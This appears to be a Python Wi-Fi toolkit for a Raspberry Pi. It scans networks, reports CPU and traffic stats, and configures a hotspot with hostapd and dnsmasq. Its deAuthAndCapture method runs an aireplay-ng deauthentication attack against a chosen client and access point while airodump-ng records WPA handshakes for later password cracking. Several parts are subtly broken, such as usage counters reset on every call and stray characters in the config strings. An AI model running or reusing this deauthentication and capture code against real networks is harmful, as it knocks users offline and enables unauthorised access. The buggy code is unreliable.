
import pywifi, subprocess, json, time
from pywifi import const
import psutil,subprocess, pywifi
from gpiozero import CPUTemperature
import asyncio

wifi = pywifi.PyWiFi()


class toolkit():
	
	def __installNeeded__():
		subprocess.run(["sudo", "apt-get", "install", "hostapd", "dnsmasq", "lm-sensors"])
   
   
	def showInterfaces() -> json:

		interfaces = wifi.interfaces()
		interfacesJson = {}
		for idx, iface in enumerate(interfaces):
			interfacesJson[idx] = {"idx": idx, "interfaceName": iface.name()}
		return interfacesJson


	async def deAuthAndCapture(interface, target_mac, ap_mac, capture_duration=10):
		# Start deauthentication attack
		deauth_command = ["aireplay-ng", "--deauth", "5", "-a", ap_mac, "-c", target_mac, interface]
		deauth_process = await asyncio.create_subprocess_exec(*deauth_command)
		
		# Start capturing packets
		capture_command = ["airodump-ng", interface, "--write", "handshake_capture"]
		capture_process = await asyncio.create_subprocess_exec(*capture_command)
		
		# Wait for the capture duration
		await asyncio.sleep(capture_duration)
		
		# Terminate processes
		deauth_process.terminate()
		capture_process.terminate()


	
	

	def getInterfaceUsage(interface: int) -> dict:
		def get_size(bytes):
			"""
			Returns size of bytes in a nice format
			"""
			for unit in ['', 'K', 'M', 'G', 'T', 'P']:
				if bytes < 1024:
					return f"{bytes:.2f}{unit}B"
				bytes /= 1024
		
		# Define bytes_sent and bytes_recv
		bytes_sent = 0  # Initial value
		bytes_recv = 0  # Initial value
		
		# Get the stats again
		io_2 = psutil.net_io_counters()
		
		# Calculate the difference in bytes sent and received
		us, ds = io_2.bytes_sent - bytes_sent, io_2.bytes_recv - bytes_recv
		
		# Update the bytes_sent and bytes_recv for the next iteration
		bytes_sent, bytes_recv = io_2.bytes_sent, io_2.bytes_recv
		
		# Return the interface usage as a dictionary
		return {"upload": get_size(us), "download": get_size(ds)}


	def get_cpu_temperature():
		try:
			temperatures = CPUTemperature().temperature
			return round(temperatures)
		except Exception as e:
			print(f"Error fetching CPU temperature: {e}")
			return None

	def get_cpu_usage():
		try:
			return  round(psutil.cpu_percent(interval=1)) # Interval is in seconds
		except Exception as e:
			print(f"Error fetching CPU usage: {e}")
			return None
   
   
	async def scan_wifi_networks(interface: int):
		if interface is None:
			print("!CRITICAL! No interface selected, please select one")
			return None
		iface = wifi.interfaces()[int(interface)]
		iface.scan()
		# give time for scanning
		await asyncio.sleep(5)
		scan_results = iface.scan_results()

		network_info = {}
		for result in scan_results:
			network_info[f"{result.ssid}"]={
				"ssid": result.ssid,
				"bssid": result.bssid,
				"signalStrength": result.signal,
				"encryption": result.akm
			}

		return network_info

	def setupAP(interface:int=0):
		hostapd_config = f"""/
interface={interface}
ssid=superSecretNetwork
hw_mode=g
channel=6
		"""

		dnsmasq_config = f"""/
interface={interface}
dhcp-range=10.0.0.2,10.0.0.240,255.255.255.0,6h
domain-needed
bogus-priv
filterwin2k
server=1.1.1.1
listen-address=0.0.0.0
no-hosts
log-dhcp
port=53
		"""
		autoIP = f"""/

allow-hotplug {interface}
iface {interface} inet static
    address 10.0.0.1
    netmask 255.255.255.0
"""
  
  
		with open("/etc/hostapd/hostapd.conf", "a") as f:
			f.write(hostapd_config)
		with open("/etc/dnsmasq/dnsmasq.conf", "a") as f:
			f.write(dnsmasq_config)
		with open("/etc/network/interfaces", "a") as f:
			f.write(autoIP)

		subprocess.run(["sudo", "systemctl", "unmask", "hostapd.service", "dnsmasq.service"])
		subprocess.run(["sudo", "systemctl", "enable", "hostapd.service", "dnsmasq.service"])
		subprocess.run(["sudo", "systemctl", "start", "hostapd.service", "dnsmasq.service"])
		subprocess.run(["sudo", "ifconfig", interface, "up"])
		print("Access point setup complete, you may need to reboot for changes to take effect")
  
